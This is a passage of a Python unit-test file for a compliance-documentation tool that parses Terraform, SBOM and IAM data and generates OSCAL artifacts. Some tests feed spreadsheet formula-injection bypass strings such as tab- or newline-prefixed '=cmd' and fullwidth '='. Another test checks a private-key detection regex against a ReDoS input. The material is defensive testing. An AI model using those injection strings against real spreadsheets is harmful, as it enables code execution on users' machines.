        self.assertTrue(clean_cell_value(";;;+cmd").startswith("'"))
        self.assertTrue(clean_cell_value(";;;-cmd").startswith("'"))

        # 3. Control and whitespace bypasses (tabs, newlines, carriage returns)
        self.assertTrue(clean_cell_value("\t=cmd").startswith("'"))
        self.assertTrue(clean_cell_value("\r\n=cmd").startswith("'"))
        self.assertTrue(clean_cell_value("\n+calc").startswith("'"))

        # 4. Zero-width and Unicode bypasses (zero-width space, BOM, soft hyphen)
        self.assertTrue(clean_cell_value("\u200b=cmd").startswith("'"))
        self.assertTrue(clean_cell_value("\ufeff=cmd").startswith("'"))
        self.assertTrue(clean_cell_value("\u00ad=cmd").startswith("'"))

        # 5. Fullwidth character bypasses (U+FF1D fullwidth =, U+FF20 fullwidth @)
        self.assertTrue(clean_cell_value("\uff1dcmd").startswith("'"))
        self.assertTrue(clean_cell_value("\uff20SUM(A1)").startswith("'"))

        # 6. Prepending single quote bypass ('=cmd)
        self.assertTrue(clean_cell_value("'=cmd").startswith("'"))

        # 7. Safe values unaffected
        self.assertEqual(clean_cell_value("Simple String"), "Simple String")
        self.assertEqual(clean_cell_value("12345"), "12345")
        self.assertEqual(clean_cell_value(42), 42)
        self.assertEqual(clean_cell_value(3.14), 3.14)
        self.assertTrue(clean_cell_value(True))
        self.assertEqual(clean_cell_value(None), "")

        # 8. Maximum cell length truncation
        long_val = "A" * 35000
        cleaned_long = clean_cell_value(long_val)
        self.assertEqual(len(cleaned_long), MAX_EXCEL_CELL_LENGTH)
        self.assertTrue(cleaned_long.endswith("..."))

    def test_exporter_registry_dependency_injection_and_isolation(self) -> None:
        """Verifies instance-based dependency injection and test isolation for ExporterRegistry."""
        from export_strategies import ExporterRegistry, BasePolicyExporter

        # Create isolated custom registry with no defaults
        isolated_reg = ExporterRegistry(load_defaults=False)
        self.assertEqual(len(isolated_reg.get_registered_policy_exporters()), 0)

        # Register mock exporter on isolated registry
        class MockCustomExporter(BasePolicyExporter):
            """Mock policy exporter used exclusively for registry isolation testing."""

            @property
            def format_name(self) -> str:
                """Format identifier string for mock exporter.

                Returns:
                    Format name string 'mock_custom'.
                """
                return "mock_custom"

            def export_document(
                self,
                content: str,
                target: Path,
                inv: Dict[str, Any],
                allowed_boundary: Optional[Union[str, Path]] = None,
            ) -> Path:
                """Writes mock policy deliverable.

                Args:
                    content: Populated policy Markdown text.
                    target: Target destination file path.
                    inv: System inventory dictionary.
                    allowed_boundary: Root boundary confining the write, as required
                        by the AbstractExporter interface.

                Returns:
                    Path to created mock artifact.
                """
                out_p = target.with_suffix(".mock")
                out_p.write_text("MOCK:" + content, encoding="utf-8")
                return out_p

        mock_exp = MockCustomExporter()
        isolated_reg.register_policy_exporter("mock_custom", mock_exp)

        # Verify isolated registry has the custom exporter
        self.assertEqual(len(isolated_reg.get_policy_exporters("mock_custom")), 1)

        # Verify global default registry was NOT polluted
        default_reg = ExporterRegistry._get_default_instance()
        self.assertNotIn("mock_custom", default_reg.get_registered_policy_exporters())

        # Test passing custom registry into generate_ato_artifacts
        inv_path = os.path.join(self.test_dir, "system_inventory.json")
        file_helpers.write_json_file(inv_path, self.mock_inventory)

        results = generate_compliance_artifacts.generate_ato_artifacts(
            self.test_dir,
            policy_format="mock_custom",
            data_format="yaml",
            registry=isolated_reg,
        )
        self.assertIn("mock_custom", results)
        self.assertGreaterEqual(len(results["mock_custom"]), 20)

    def test_hcl2_ast_parsing_and_nested_attribute_extraction(self) -> None:
        """Verifies python-hcl2 AST parsing, nested maps, and HclBlock behavior."""
        import extract_system_data as esd

        # 1. HclBlock behavior
        ast_dict = {
            "tags": [{"Name": "production-bastion", "Environment": "Production"}],
            "network_interface": [{"network_ip": "10.10.1.5"}],
            "machine_type": ["n2-standard-4"],
        }
        block = esd.HclBlock('name = "bastion"\nzone = "us-central1-a"', parsed=ast_dict)

        # String methods check
        self.assertIn("name = ", block)
        self.assertTrue(block.startswith("name = "))
        self.assertEqual(block.parsed.get("machine_type"), ["n2-standard-4"])

        # extract_hcl_attr with AST dict
        self.assertEqual(
            esd.extract_hcl_attr(block, "tags.Name"),
            "production-bastion",
        )
        self.assertEqual(
            esd.extract_hcl_attr(block, "tags.Environment"),
            "Production",
        )
        self.assertEqual(
            esd.extract_hcl_attr(block, "network_interface.network_ip"),
            "10.10.1.5",
        )
        self.assertEqual(
            esd.extract_hcl_attr(block, "machine_type"),
            "n2-standard-4",
        )

        # 2. Variable resolution: var.xyz and ${var.xyz}
        vars_lookup = {"vm_size": "c2-standard-16", "app_zone": "us-east4-b"}
        dict_with_vars = {
            "size": ["var.vm_size"],
            "zone": ["${var.app_zone}"],
        }
        self.assertEqual(
            esd.extract_hcl_attr(dict_with_vars, "size", vars_dict=vars_lookup),
            "c2-standard-16",
        )
        self.assertEqual(
            esd.extract_hcl_attr(dict_with_vars, "zone", vars_dict=vars_lookup),
            "us-east4-b",
        )

    def test_ssp_and_iam_sanitization_no_raw_tokens(self) -> None:
        """Verifies resolution and sanitization of raw HCL tokens in SSP IAM tables."""
        sas = [
            {"resource_name": "pipeline_worker", "account_id": "sa-pipeline-worker", "file": "pipeline/main.tf"},
            {"resource_name": "monitoring_sa", "account_id": "sa-monitoring", "file": "monitoring/iam.tf"},
            {"resource_name": "log_collector", "account_id": "sa-log-collector", "file": "log_collector/main.tf"},
        ]
        res_vars = {"project_id": "test-prj", "project_number": "987654321"}

        # 1. KMS CMEK each.value.member
        p1 = extract_system_data.resolve_iam_principal(
            "${each.value.member}",
            rel_file="kms/main.tf",
            role_val="roles/cloudkms.cryptoKeyEncrypterDecrypter",
            resolved_vars=res_vars,
            service_accounts=sas,
        )
        self.assertIsNotNone(p1)
        self.assertNotIn("${", p1)
        self.assertIn("CMEK Key Encrypter/Decrypter", p1)

        # 2. Impersonators each.value
        p2 = extract_system_data.resolve_iam_principal(
            "${each.value}",
            res_name="impersonator_service_usage",
            role_val="roles/serviceusage.serviceUsageConsumer",
            resolved_vars=res_vars,
            service_accounts=sas,
        )
        self.assertIsNotNone(p2)
        self.assertNotIn("${", p2)
        self.assertIn("Impersonator", p2)

        # 3. Secret manager identity
        p3 = extract_system_data.resolve_iam_principal(
            "serviceAccount:${google_project_service_identity.secretmanager_sa[each.key].email}",
            resolved_vars=res_vars,
            service_accounts=sas,
        )
        self.assertIsNotNone(p3)
        self.assertNotIn("${", p3)
        self.assertIn("service-987654321@gcp-sa-secretmanager", p3)

        # 4. Service account email reference
        p4 = extract_system_data.resolve_iam_principal(
            "serviceAccount:${google_service_account.pipeline_worker.email}",
            resolved_vars=res_vars,
            service_accounts=sas,
        )
        self.assertEqual(p4, "serviceAccount:sa-pipeline-worker@test-prj.iam.gserviceaccount.com")

        # 5. Local sa email reference
        p5 = extract_system_data.resolve_iam_principal(
            "serviceAccount:${local.sa_email}",
            rel_file="log_collector/main.tf",
            resolved_vars=res_vars,
            service_accounts=sas,
        )
        self.assertEqual(p5, "serviceAccount:sa-log-collector@test-prj.iam.gserviceaccount.com")

        # 6. Abstract passthrough with each.value.role must be filtered out
        p6 = extract_system_data.resolve_iam_principal(
            "${each.value.member}",
            role_val="${each.value.role}",
            resolved_vars=res_vars,
            service_accounts=sas,
        )
        self.assertIsNone(p6)

        # 7. format_separation_of_duties_table full rendering test
        test_inv = {
            "system_information": {
                "cloud_provider": "Google Cloud Platform",
                "cloud_service_provider_abbr": "GCP",
                "project_id": "test-workload-proj",
                "project_number": "123456789012",
            },
            "infrastructure_components": {
                "iam_bindings": [
                    {"principal": "${each.value.member}", "role": "roles/cloudkms.cryptoKeyEncrypterDecrypter", "file": "kms.tf"},
                    {"principal": "${each.value}", "role": "roles/serviceusage.serviceUsageConsumer", "file": "sa.tf"},
                    {"principal": "serviceAccount:service-${var.project_number}@gcp-sa-pubsub.iam.gserviceaccount.com", "role": "roles/bigquery.dataEditor", "file": "pubsub.tf"},
                    {"principal": "serviceAccount:${google_service_account.app_worker.email}", "role": "roles/storage.objectAdmin", "file": "worker.tf"},
                    {"principal": "${each.value.member}", "role": "${each.value.role}", "file": "iam.tf"},
                ],
                "service_accounts": [
                    {"account_id": "sa-app-worker", "resource_name": "app_worker", "file": "worker.tf"}
                ]
            }
        }
        rendered_table = generate_compliance_artifacts.format_separation_of_duties_table(test_inv)
        self.assertNotIn("${", rendered_table)
        self.assertNotIn("each.value", rendered_table)
        self.assertNotIn("var.", rendered_table)
        self.assertIn("CMEK Key Encrypter/Decrypter Service Agents", rendered_table)
        self.assertIn("Deployment & CI/CD Pipeline Impersonators", rendered_table)
        self.assertIn("serviceAccount:service-123456789012@gcp-sa-pubsub.iam.gserviceaccount.com", rendered_table)
        self.assertIn("serviceAccount:sa-app-worker@test-workload-proj.iam.gserviceaccount.com", rendered_table)


    def test_ingest_terraform_json_plan(self) -> None:
        """Tests ingestion and schema translation of HashiCorp Terraform show -json plan data."""
        tf_plan_fixture = {
            "format_version": "1.0",
            "terraform_version": "1.5.7",
            "planned_values": {
                "root_module": {
                    "resources": [
                        {
                            "address": "google_compute_network.custom_vpc",
                            "mode": "managed",
                            "type": "google_compute_network",
                            "name": "custom_vpc",
                            "values": {
                                "name": "c2-spoke-prod-vpc",
                                "auto_create_subnetworks": False,
                                "project": "c2-prod-project"
                            }
                        },
                        {
                            "address": "google_compute_subnetwork.app_subnet",
                            "mode": "managed",
                            "type": "google_compute_subnetwork",
                            "name": "app_subnet",
                            "values": {
                                "name": "c2-prod-app-subnet",
                                "ip_cidr_range": "10.50.1.0/24",
                                "network": "c2-spoke-prod-vpc",
                                "region": "us-east4"
                            }
                        },
                        {
                            "address": "google_storage_bucket.app_data",
                            "mode": "managed",
                            "type": "google_storage_bucket",
                            "name": "app_data",
                            "values": {
                                "name": "c2-prod-app-data-bucket",
                                "location": "US-EAST4",
                                "storage_class": "STANDARD",
                                "uniform_bucket_level_access": True,
                                "versioning": [{"enabled": True}],
                                "encryption": [{"default_kms_key_name": "projects/c2-kms-p/locations/us-east4/keyRings/c2-kr/cryptoKeys/key-storage"}]
                            }
                        },
                        {
                            "address": "google_service_account.worker_sa",
                            "mode": "managed",
                            "type": "google_service_account",
                            "name": "worker_sa",
                            "values": {
                                "account_id": "sa-c2-worker",
                                "display_name": "Production C2 Worker Execution SA",
                                "email": "sa-c2-worker@c2-prod-project.iam.gserviceaccount.com"
                            }
                        },
                        {
                            "address": "google_project_iam_member.worker_storage",
                            "mode": "managed",
                            "type": "google_project_iam_member",
                            "name": "worker_storage",
                            "values": {
                                "member": "serviceAccount:sa-c2-worker@c2-prod-project.iam.gserviceaccount.com",
                                "project": "c2-prod-project",
                                "role": "roles/storage.objectViewer"
                            }
                        },
                        {
                            "address": "google_compute_instance.bastion",
                            "mode": "managed",
                            "type": "google_compute_instance",
                            "name": "bastion",
                            "values": {
                                "name": "c2-bastion-vm",
                                "machine_type": "n2-standard-4",
                                "zone": "us-east4-a",
                                "boot_disk": [{"kms_key_self_link": "projects/c2-kms-p/locations/us-east4/keyRings/c2-kr/cryptoKeys/key-compute"}],
                                "shielded_instance_config": [{"enable_secure_boot": True}]
                            }
                        }
                    ],
                    "child_modules": [
                        {
                            "address": "module.kms",
                            "resources": [
                                {
                                    "address": "module.kms.google_kms_crypto_key.storage_key",
                                    "mode": "managed",
                                    "type": "google_kms_crypto_key",
                                    "name": "storage_key",
                                    "values": {
                                        "name": "key-storage",
                                        "key_ring": "projects/c2-kms-p/locations/us-east4/keyRings/c2-kr",
                                        "purpose": "ENCRYPT_DECRYPT",
                                        "rotation_period": "7776000s",
                                        "version_template": [{"protection_level": "HSM"}]
                                    }
                                }
                            ]
                        }
                    ]
                }
            }
        }
        res = extract_system_data.ingest_terraform_json(tf_plan_fixture)
        self.assertIn("c2-spoke-prod-vpc", res["networks"])
        self.assertIn("10.50.1.0/24", res["subnets"])
        self.assertEqual(res["storage_buckets"][0]["name"], "c2-prod-app-data-bucket")
        self.assertTrue(res["storage_buckets"][0]["cmek_encrypted"])
        self.assertEqual(res["kms_keys"][0]["protection_level"], "HSM")
        self.assertEqual(res["compute_instances"][0]["name"], "c2-bastion-vm")
        self.assertTrue(res["compute_instances"][0]["shielded_vm"])
        self.assertEqual(res["service_accounts"][0]["account_id"], "sa-c2-worker")
        self.assertEqual(res["service_accounts"][0]["email"], "sa-c2-worker@c2-prod-project.iam.gserviceaccount.com")
        self.assertEqual(res["iam_bindings"][0]["role"], "roles/storage.objectViewer")
        self.assertIn("storage.googleapis.com", res["services"])
        self.assertIn("compute.googleapis.com", res["services"])
        self.assertIn("cloudkms.googleapis.com", res["services"])
        self.assertEqual(res["terraform_engine_version"], "1.5.7")
        self.assertIn("FIPS 140-3 Level 3 Cloud HSM CMEK", res["encryption_summary"])

    def test_ingest_sbom_json_cyclonedx(self) -> None:
        """Tests ingestion and schema translation of CycloneDX SBOM data."""
        cyclonedx_fixture = {
            "bomFormat": "CycloneDX",
            "specVersion": "1.4",
            "metadata": {
                "component": {
                    "name": "c2-edge-service",
                    "version": "2.4.0",
                    "type": "application"
                }
            },
            "components": [
                {
                    "name": "fastapi",
                    "version": "0.109.0",
                    "type": "framework",
                    "purl": "pkg:pypi/fastapi@0.109.0",
                    "licenses": [{"license": {"id": "MIT"}}],
                    "description": "FastAPI web framework"
                },
                {
                    "name": "asyncpg",
                    "version": "0.29.0",
                    "type": "library",
                    "purl": "pkg:pypi/asyncpg@0.29.0",
                    "licenses": [{"license": {"id": "Apache-2.0"}}],
                    "description": "PostgreSQL client driver"
                }
            ]
        }
        res = extract_system_data.ingest_sbom_json(cyclonedx_fixture)
        self.assertEqual(len(res["software_packages"]), 2)
        self.assertIn("Python", res["runtimes"])
        self.assertIn("FastAPI REST Microservice", res["frameworks"])
        self.assertIn("PostgreSQL (asyncpg/psycopg2)", res["database_connectors"])
        self.assertEqual(res["applications"][0]["name"], "c2-edge-service")

    def test_terraform_and_sbom_auto_discovery_and_overrides(self) -> None:
        """Tests auto-discovery and explicit path overrides for Terraform plan/state and SBOM."""
        test_dir = tempfile.mkdtemp(prefix="tf_sbom_test_")
        try:
            # 1. Test fallback when no files exist
            tf_none = extract_system_data.discover_or_generate_terraform_json(test_dir)
            self.assertIsNone(tf_none)
            sbom_none = extract_system_data.discover_or_generate_sbom(test_dir)
            self.assertIsNone(sbom_none)

            # 2. Test auto-discovery in tfplan.json and sbom.json
            tf_dir = os.path.join(test_dir, "terraform")
            os.makedirs(tf_dir, exist_ok=True)
            with open(os.path.join(tf_dir, "tfplan.json"), "w", encoding="utf-8") as f:
                json.dump({"format_version": "1.0", "terraform_version": "1.5.7", "planned_values": {"root_module": {"resources": []}}}, f)

            app_dir = os.path.join(test_dir, "app")
            os.makedirs(app_dir, exist_ok=True)
            with open(os.path.join(app_dir, "sbom.json"), "w", encoding="utf-8") as f:
                json.dump({"bomFormat": "CycloneDX", "components": [{"name": "pytest", "version": "8.0.0", "purl": "pkg:pypi/pytest@8.0.0"}]}, f)

            tf_found = extract_system_data.discover_or_generate_terraform_json(test_dir)
            self.assertIsNotNone(tf_found)
            self.assertEqual(tf_found["terraform_version"], "1.5.7")

            sbom_found = extract_system_data.discover_or_generate_sbom(test_dir)
            self.assertIsNotNone(sbom_found)
            self.assertEqual(len(sbom_found["components"]), 1)

            # 3. Test explicit path overrides via user_config
            custom_plan = os.path.join(test_dir, "my_plan.json")
            with open(custom_plan, "w", encoding="utf-8") as f:
                json.dump({"format_version": "1.0", "terraform_version": "1.6.0", "values": {"root_module": {"resources": []}}}, f)

            user_cfg = {"terraform_plan_path": "my_plan.json"}
            tf_override = extract_system_data.discover_or_generate_terraform_json(test_dir, user_config=user_cfg)
            self.assertIsNotNone(tf_override)
            self.assertEqual(tf_override["terraform_version"], "1.6.0")

        finally:
            shutil.rmtree(test_dir, ignore_errors=True)

    def test_oscal_ssp_generation_and_validation(self) -> None:
        """Verifies NIST OSCAL System Security Plan and Component Definition generation and validation."""
        import oscal_generator

        # 1. Test OSCAL model creation with default version (1.2.3)
        ssp = oscal_generator.generate_oscal_ssp(self.mock_inventory, doc_version="1.2.0")
        self.assertIn("system-security-plan", ssp)
        ssp_data = ssp["system-security-plan"]

        # Check metadata defaults to 1.2.3
        meta = ssp_data.get("metadata", {})
        self.assertEqual(meta.get("oscal-version"), "1.2.3")
        self.assertEqual(meta.get("version"), "1.2.0")
        self.assertTrue(meta.get("title").startswith("System Security Plan (SSP)"))
        self.assertGreaterEqual(len(meta.get("roles", [])), 4)
        self.assertGreaterEqual(len(meta.get("parties", [])), 4)

        # 1b. Test OSCAL model creation with explicit legacy version (1.1.0)
        ssp_110 = oscal_generator.generate_oscal_ssp(self.mock_inventory, doc_version="1.2.0", oscal_version="1.1.0")
        self.assertEqual(ssp_110["system-security-plan"]["metadata"].get("oscal-version"), "1.1.0")

        # Check system characteristics
        sys_chars = ssp_data.get("system-characteristics", {})
        self.assertEqual(sys_chars.get("system-name"), "Enterprise Secure Cloud Foundation")
        self.assertEqual(sys_chars.get("system-name-short"), "SCF")
        self.assertEqual(sys_chars.get("status", {}).get("state"), "operational")

        # Check components
        sys_impl = ssp_data.get("system-implementation", {})
        components = sys_impl.get("components", [])
        self.assertGreaterEqual(len(components), 5)
        comp_types = {c["type"] for c in components}
        self.assertTrue("service" in comp_types or "software" in comp_types)

        # Check control implementation
        ctrl_impl = ssp_data.get("control-implementation", {})
        reqs = ctrl_impl.get("implemented-requirements", [])
        self.assertGreaterEqual(len(reqs), 15)
        ctrl_ids = {r["control-id"] for r in reqs}
        for expected_id in ["ac-2", "ac-3", "ac-4", "au-2", "cm-2", "sc-7", "sc-12", "sc-28", "si-4"]:
            self.assertIn(expected_id, ctrl_ids, f"NIST control {expected_id} must be implemented")

        # 2. Test Component Definition generation (default 1.2.3 and 1.1.0)
        comp_def = oscal_generator.generate_oscal_component_definition(self.mock_inventory)
        self.assertIn("component-definition", comp_def)
        cd_data = comp_def["component-definition"]
        self.assertEqual(cd_data.get("metadata", {}).get("oscal-version"), "1.2.3")
        self.assertGreaterEqual(len(cd_data.get("components", [])), 5)

        comp_def_110 = oscal_generator.generate_oscal_component_definition(self.mock_inventory, oscal_version="1.1.0")
        self.assertEqual(comp_def_110["component-definition"]["metadata"].get("oscal-version"), "1.1.0")

        # 3. Test Export & Validation (default 1.2.3)
        oscal_files = oscal_generator.export_oscal_artifacts(
            self.test_dir, self.mock_inventory, doc_version="1.2.0", oscal_format="both"
        )
        self.assertEqual(len(oscal_files), 4, "Must export 4 files (.json and .yaml for SSP and ComponentDef)")
        for p in oscal_files:
            self.assertTrue(p.exists(), f"OSCAL deliverable {p} must exist on disk")

        # Test audit in validate_compliance_artifacts
        ato_dir = os.path.join(self.test_dir, "ato_artifacts")
        audit_res = validate_compliance_artifacts.audit_oscal_packages(ato_dir)
        self.assertEqual(len(audit_res), 2, "Must audit both JSON deliverables")
        for res in audit_res:
            self.assertEqual(res["status"], "PASS")
            self.assertEqual(res["oscal_version"], "1.2.3")
            self.assertFalse(res["issues"])

        # 3b. Test Export & Validation with explicit legacy version 1.1.0
        oscal_files_110 = oscal_generator.export_oscal_artifacts(
            self.test_dir, self.mock_inventory, doc_version="1.2.0", oscal_format="json", oscal_version="1.1.0"
        )
        audit_res_110 = validate_compliance_artifacts.audit_oscal_packages(ato_dir)
        for res in audit_res_110:
            self.assertEqual(res["status"], "PASS")
            self.assertEqual(res["oscal_version"], "1.1.0")
            self.assertFalse(res["issues"])

    def test_ipv6_and_ipv4_cidr_validation(self) -> None:
        """Tests that is_valid_cidr accurately accepts valid IPv4 and IPv6 CIDRs and rejects invalid inputs."""
        # Valid IPv6 CIDRs
        self.assertTrue(extract_system_data.is_valid_cidr("::/0"), "IPv6 default route ::/0 must be valid")
        self.assertTrue(extract_system_data.is_valid_cidr("2001:db8::/32"), "IPv6 documentation CIDR must be valid")
        self.assertTrue(extract_system_data.is_valid_cidr("fe80::/10"), "IPv6 link-local CIDR must be valid")
        self.assertTrue(extract_system_data.is_valid_cidr("::ffff:0:0/96"), "IPv4-mapped IPv6 CIDR must be valid")
        self.assertTrue(extract_system_data.is_valid_cidr("  2001:db8::/48  "), "Whitespace-padded IPv6 CIDR must be valid")

        # Valid IPv4 CIDRs
        self.assertTrue(extract_system_data.is_valid_cidr("0.0.0.0/0"), "IPv4 default route 0.0.0.0/0 must be valid")
        self.assertTrue(extract_system_data.is_valid_cidr("10.0.0.0/8"), "IPv4 Class A CIDR must be valid")
        self.assertTrue(extract_system_data.is_valid_cidr("172.16.0.0/12"), "IPv4 Class B CIDR must be valid")
        self.assertTrue(extract_system_data.is_valid_cidr("192.168.1.0/24"), "IPv4 Class C CIDR must be valid")
        self.assertTrue(extract_system_data.is_valid_cidr("10.10.0.0/16"), "IPv4 /16 CIDR must be valid")

        # Invalid CIDRs / Non-CIDRs (must be rejected)
        self.assertFalse(extract_system_data.is_valid_cidr(""), "Empty string must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr("10.0.0.1"), "Bare IP without slash must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr("::1"), "Bare IPv6 without slash must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr("10.0.0.0/33"), "IPv4 prefix > 32 must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr("2001:db8::/129"), "IPv6 prefix > 128 must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr("not_a_cidr"), "Non-CIDR string must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr("${var.cidr}"), "HCL interpolation must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr("try(var.cidr, '10.0.0.0/8')"), "HCL function must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr("null"), "Null string must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr(None), "NoneType must be rejected")
        self.assertFalse(extract_system_data.is_valid_cidr(12345), "Non-string type must be rejected")

    def test_foundational_yaml_error_bubbling(self) -> None:
        """Tests that load_all_system_configs bubbles explicit ValueError on corrupted foundational configs."""
        bad_dir = os.path.join(self.test_dir, "bad_yaml_test")
        os.makedirs(bad_dir, exist_ok=True)

        # 1. Corrupted compliance_config.yaml (invalid syntax)
        bad_compliance_path = os.path.join(bad_dir, "compliance_config.yaml")
        with open(bad_compliance_path, "w", encoding="utf-8") as f:
            f.write("system_information:\n  name: [unclosed list\n    broken_indent: true\n")

        with self.assertRaises(ValueError) as ctx:
            extract_system_data.load_all_system_configs(bad_dir)
        self.assertIn("compliance_config.yaml", str(ctx.exception))
        self.assertIn("Foundational compliance configuration", str(ctx.exception))

        # 2. Corrupted system_config.yaml
        os.remove(bad_compliance_path)
        bad_system_path = os.path.join(bad_dir, "system_config.yaml")
        with open(bad_system_path, "w", encoding="utf-8") as f:
            f.write("invalid_yaml: {unclosed mapping\n")

        with self.assertRaises(ValueError) as ctx:
            extract_system_data.load_all_system_configs(bad_dir)
        self.assertIn("system_config.yaml", str(ctx.exception))
        self.assertIn("Foundational compliance configuration", str(ctx.exception))

        # 3. Empty foundational config file
        with open(bad_system_path, "w", encoding="utf-8") as f:
            f.write("")

        with self.assertRaises(ValueError) as ctx:
            extract_system_data.load_all_system_configs(bad_dir)
        self.assertIn("is empty or invalid", str(ctx.exception))

        # Cleanup
        os.remove(bad_system_path)

    def test_private_key_pattern_redos_bounded(self) -> None:
        """Tests that PRIVATE_KEY_PATTERN matches legitimate PEM keys and prevents ReDoS on adversarial payloads."""
        import time

        # Valid PEM formats
        valid_rsa = (
            "-----BEGIN RSA PRIVATE KEY-----\n"
            "MIIEowIBAAKCAQEA0Y1+example+data+for+unit+test+key+payload+here==\n"
            "-----END RSA PRIVATE KEY-----"
        )
        self.assertTrue(file_helpers.PRIVATE_KEY_PATTERN.search(valid_rsa), "Must match valid RSA PEM key")

        valid_pkcs8 = (
            "-----BEGIN PRIVATE KEY-----\n"
            "MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC7\n"
            "-----END PRIVATE KEY-----"
        )
        self.assertTrue(file_helpers.PRIVATE_KEY_PATTERN.search(valid_pkcs8), "Must match valid PKCS#8 PEM key")

        # Test scrub_sensitive_data properly masks the key
        scrubbed = file_helpers.scrub_sensitive_data(f"key_data: {valid_rsa}")
        self.assertEqual(scrubbed, "key_data: [REDACTED_SENSITIVE]")
        self.assertNotIn("MIIEowIBAAKCAQEA0Y1", scrubbed)

        # Adversarial payload: 100,000 characters with opening tag but NO closing tag
        # An unbounded regex would suffer exponential/polynomial backtracking here.
        # Bounded quantifier {0,8192} ensures deterministic, instant linear exit.
        adversarial_input = "-----BEGIN RSA PRIVATE KEY-----" + ("A" * 100000)
        start_time = time.perf_counter()
        match = file_helpers.PRIVATE_KEY_PATTERN.search(adversarial_input)
        elapsed_time = time.perf_counter() - start_time

        self.assertIsNone(match, "Unclosed delimiter must not match")
        self.assertLess(elapsed_time, 0.05, f"Regex evaluated in {elapsed_time:.4f}s; must complete in <50ms without ReDoS")

    def test_sanitization_no_magic_fallback_thirteen(self) -> None:
        """Tests that container and package placeholder sanitization produces clean fallbacks and never '13'."""
        mock_inv = {
            "system_information": {"name": "Test System", "abbreviation": "TS"},
            "application_components": {
                "container_images": [
                    {"base_image": "gcr.io/my-project/app-server:${image_tag}", "file": "Dockerfile"},
                    {"base_image": "us-docker.pkg.dev/proj/repo/api:$IMAGE_TAG", "file": "Dockerfile.api"},
                    {"base_image": "nginx:${var.nginx_version}", "file": "nginx/Dockerfile"},
                ],
                "software_packages": [
                    {"package_name": "${package_name}", "version": "1.0.0"},
                    {"package_name": "$UNKNOWN_PKG", "version": "2.0.0"},
                ],
            },
        }

        hw_sw_yaml = generate_compliance_artifacts.generate_hwsw_inventory_yaml(mock_inv)
        self.assertNotIn(":13", hw_sw_yaml, "Container tags must never be sanitized with magic number '13'")
        self.assertNotIn("software_name: \"13\"", hw_sw_yaml, "Package names must never be sanitized with magic number '13'")
        self.assertNotIn("software_name: 13", hw_sw_yaml, "Package names must never be sanitized with magic number '13'")
        self.assertIn("version: \"latest\"", hw_sw_yaml, "Variable container tags should resolve to 'latest'")
        self.assertIn("unknown-package", hw_sw_yaml, "Unresolved variable package names should resolve to 'unknown-package'")

    def test_package_structure_and_facades(self) -> None:
        """Tests that .gemini.skills.compliance and utils facade can be imported cleanly."""
        import utils
        self.assertTrue(callable(utils.clean_cell_value))
        self.assertTrue(callable(utils.read_yaml_file))
        self.assertTrue(callable(utils.write_text_file))
        self.assertTrue(callable(utils.validate_system_inventory_schema))

        # Check __all__ consistency
        for attr in utils.__all__:
            self.assertTrue(hasattr(utils, attr), f"utils module must export '{attr}'")

    def test_yaml_example_hydration_preserves_yaml_syntax(self) -> None:
        """Tests that hydrate_example_data_in_artifacts generates valid YAML without HTML <mark> tags."""
        import tempfile
        import yaml
        with tempfile.TemporaryDirectory() as tmp_dir:
            yaml_path = os.path.join(tmp_dir, "test_matrix.yaml")
            md_path = os.path.join(tmp_dir, "test_doc.md")

            yaml_raw = (
                "system:\n"
                "  name: [CONFIG_REQUIRED: System Name]\n"
                '  quoted_name: "[CONFIG_REQUIRED: Quoted Name]"\n'
                "  owner:\n"
                "    email: [CONFIG_REQUIRED: Owner Email]\n"
            )
            md_raw = "# System [CONFIG_REQUIRED: System Name]\nOwner: [CONFIG_REQUIRED: Owner Email]"

            file_helpers.write_text_file(yaml_path, yaml_raw)
            file_helpers.write_text_file(md_path, md_raw)

            tagged_count = validate_compliance_artifacts.hydrate_example_data_in_artifacts([yaml_path, md_path])
            self.assertEqual(tagged_count, 2)

            # Markdown must contain contextual example placeholders and no HTML mark tags
            hydrated_md = file_helpers.read_text_file(md_path)
            self.assertNotIn("<mark", hydrated_md)
            self.assertIn("[AI CONTEXTUAL EXAMPLE REQUIRED: System Name]", hydrated_md)

            # YAML must NEVER contain HTML mark tags; must be valid YAML AST
            hydrated_yaml = file_helpers.read_text_file(yaml_path)
            self.assertNotIn("<mark", hydrated_yaml)
            self.assertIn("[AI CONTEXTUAL EXAMPLE REQUIRED: System Name]", hydrated_yaml)

            # Must parse cleanly with standard YAML parser
            parsed = yaml.safe_load(hydrated_yaml)
            self.assertEqual(parsed["system"]["name"], "[AI CONTEXTUAL EXAMPLE REQUIRED: System Name]")
            self.assertEqual(parsed["system"]["quoted_name"], "[AI CONTEXTUAL EXAMPLE REQUIRED: Quoted Name]")
            self.assertEqual(parsed["system"]["owner"]["email"], "[AI CONTEXTUAL EXAMPLE REQUIRED: Owner Email]")

    def test_oscal_dod_il5_omits_scc_in_boundary(self) -> None:
        """Tests that OSCAL generator disables Security Command Center for DoD IL5/DISA baselines."""
        dod_inventory = {
            "system_information": {
                "system_name": "DoD Secure Cloud",
                "system_abbreviation": "DSC",
                "impact_level": "DoD IL5",
                "compliance_baseline": "DoD SRG / DISA STIG",
            },
            "infrastructure_components": {
                "service_accounts": ["sa-app@proj.iam.gserviceaccount.com"],
                "assured_workloads": [{"name": "il5-workload"}],
            },
            "network_architecture": {
                "networks": ["vpc-il5-prod"],
                "subnets": ["subnet-1"],
                "firewall_rules": ["fw-allow-internal"],
            },
            "application_components": {},
        }

        # Check components
        comps, comp_map = oscal_generator.build_oscal_components(dod_inventory)
        logging_comp = next((c for c in comps if c.get("uuid") == comp_map.get("logging_monitoring")), None)
        self.assertIsNotNone(logging_comp)
        self.assertIn("CSSP Export Sinks", logging_comp["title"])
        self.assertNotIn("Security Command Center", logging_comp["title"])
        self.assertIn("Centralized audit logging sinks exporting security telemetry", logging_comp["description"])

        # Check control implementations
        ctrl_impl = oscal_generator.build_oscal_control_implementations(dod_inventory, comp_map)
        reqs = {r["control-id"]: r for r in ctrl_impl.get("implemented-requirements", [])}

        # cm-6, ra-5, si-4
        self.assertIn("cm-6", reqs)
